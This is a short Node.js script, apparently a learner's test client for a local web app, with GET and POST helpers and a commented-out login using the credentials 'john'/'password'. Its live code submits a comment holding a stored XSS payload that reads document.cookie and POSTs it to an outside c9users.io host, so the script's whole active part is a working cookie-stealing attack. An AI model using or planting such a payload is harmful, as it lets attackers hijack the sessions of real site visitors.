var http = require('http')

var host = "127.0.0.1"
var port = 8080

var parseres = function(callback) {
  return function(res)
  {
      var output = '';
      console.log("status: " + res.statusCode);
      res.setEncoding('utf8');
  
      res.on('data', function (chunk) {
          output += chunk;
      });
  
      res.on('end', function() {
          callback(res, output);
      });
  }
}

var getRequest = function(url, cookies, callback) {
  var options = {
    host: host,
    port: port,
    path: url,
    method: 'GET',
    headers: {
      "Cookie": cookies.join( "; " )
    }
  };

  var req = http.request(options, parseres(callback));

  req.on('error', function(err) {
      console.log(err);
  });

  req.end();
}

var postRequest = function(url, body, cookies, callback) {
  var request = http.request({
    hostname: host,
    port: port,
    path: url,
    method: "POST",
    headers: {
        "Content-Type": "application/json",
        "Cookie": cookies.join( "; " )
    }
  }, parseres(callback));

  request.write(JSON.stringify(body));
  request.end()
}

// postRequest("/login", {username: "john", password: "password"}, [], (res, output) => {
//   console.log(output);
//   var setcookie = res.headers["set-cookie"];
//   // console.log(setcookie)
//   // if ( setcookie ) {
//   //   setcookie.forEach(
//   //     function ( cookiestr ) {
//   //       console.log( "COOKIE:" + cookiestr );
//   //     }
//   //   );
//   // }

//   getRequest("/", setcookie, (res, output) => {
//     console.log(res.headers)
//     console.log(output);
//   })
// });

postRequest("/comment", {
  comment: '<script>var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "POST", "http://learn-node-dan121.c9users.io/", false ); xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); xmlHttp.send( document.cookie ); document.title=document.cookie</script>'
}, [], (res, output) => {
  console.log(output)
});